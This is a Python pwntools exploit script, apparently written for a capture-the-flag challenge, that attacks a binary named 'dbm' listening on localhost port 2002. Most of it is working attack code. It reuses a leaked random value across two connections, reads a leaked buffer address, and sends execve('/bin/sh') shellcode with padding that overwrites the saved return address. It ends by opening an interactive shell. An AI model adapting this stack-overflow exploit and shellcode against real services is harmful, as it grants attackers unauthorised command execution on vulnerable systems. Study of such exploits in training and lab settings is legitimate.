from pwn import *

# specify the target binary
binary = './dbm'
# specify the target architecture
context.binary = binary
context.arch = 'amd64'
p = remote('localhost', 2002)
p.recvuntil(': ')
p.sendline('1')
recievedBytes =  p.recvall().decode('utf-8')
p.close()
randomNumber = recievedBytes.split('\n')[0].split(' ')[-1] # get the random number since the connection will be closed and opened again time won't be a change so we can use the same random number
p = remote('localhost', 2002)
# p = process(binary)
p.recvuntil(': ')
p.sendline(randomNumber)
address = p.recvline().decode('utf-8').strip() # get the address of the buffer
p.recvuntil(': ')
shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' # shellcode
# print len of shellcode
offest = 64 + 8 # 64 is the length of the buffer and 8 is the length of the saved rbp
payload = shellcode + b'A' * (offest - len(shellcode)) + p64(int(address, 16)) # write shellcode to the buffer and overwrite the return address with the address of the buffer
p.sendline(payload)
p.interactive()